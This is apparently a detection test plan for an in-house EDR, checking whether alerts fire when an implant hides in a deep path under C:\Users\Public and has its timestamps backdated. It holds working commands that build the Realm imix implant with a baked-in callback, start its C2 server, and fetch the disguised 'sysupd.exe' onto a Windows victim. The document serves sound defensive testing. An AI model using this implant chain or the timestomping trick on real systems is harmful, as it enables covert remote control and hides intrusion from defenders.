# Test: Evasion — deep innocuous path + timestamp spoofing (T1036.005 / T1070.006)

**Chain:** implant hidden at `C:\Users\Public\Intel\DriverStore\` with creation/write times
backdated to 2020 — evades shallow directory checks, "recently modified" sorts, and
mtime-keyed scan caches.

**Implant setup — creation to the Windows machine (do once before the test):**

**a) Kali, one-time tooling** (skip if already installed):
```bash
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y && source ~/.cargo/env
rustup target add x86_64-pc-windows-gnu
sudo apt update && sudo apt install -y golang git
```

**b) Kali — clone Realm, build the implant (callback baked in), start the C2:**
```bash
git clone https://github.com/spellshift/realm.git ~/realm && cd ~/realm
git checkout -b latest $(git tag | tail -1)
go run ./tavern                 # terminal 1: Tavern C2 server - leave running

cd ~/realm/implants/imix        # terminal 2: build with YOUR Kali IP baked in
IMIX_CALLBACK_URI=http://172.16.69.109:8080 cargo build --release
mkdir -p ~/sideload-lab && cp target/release/imix.exe ~/sideload-lab/sysupd.exe
```

**c) Kali — serve the binaries:**
```bash
cd ~/sideload-lab && python3 -m http.server 8000
```

**d) Windows — put the implant on the machine + prep the EDR** (elevated PowerShell):
```powershell
Invoke-WebRequest http://172.16.69.109:8000/sysupd.exe -OutFile C:\Users\Public\sysupd.exe
# EDR running + fresh persistence baseline:
curl.exe -X POST http://127.0.0.1:8420/api/baseline
# console: http://127.0.0.1:8420 - alerts stream into the LIVE panel
```
These drops themselves should already fire `SIG-REALM-IMIX` / `SIG-RUST-IMPLANT`
(on-write scan) — delivery detection working before the test even starts.
Full reference: [`../_common/implant-build.md`](../_common/implant-build.md).


**Victim (elevated PowerShell):** `.\test.ps1`

**Expected alerts:**

| Rule | Sev | Trigger | Survives the evasion? |
|---|---|---|---|
| `EVT-4688-TEMP` | high | launch — path is still under `\Users\Public\` | ✅ deep path doesn't matter |
| `SIG-*` on write | crit/high | signature scan of user-writable roots | ⚠️ partially — see below |
| timestomping itself | — | **filed gap** | ❌ no file-metadata telemetry |

**Known limitation this test documents:** the signature scanner caches by (size, mtime);
backdating the mtime *after* a scan won't hide a changed file (size/mtime pair differs),
but timestomping is itself invisible. The real fix (filed in the backlog register): flag
`CreationTime ≠ LastWriteTime` anomalies and metadata-only changes in scanned roots.

**Judgment:** the *launch* must still alert (path rule is depth-blind). Only the
timestomping act goes unseen — that's the gap, not a bug.

**Cleanup:** remove `C:\Users\Public\Intel`.
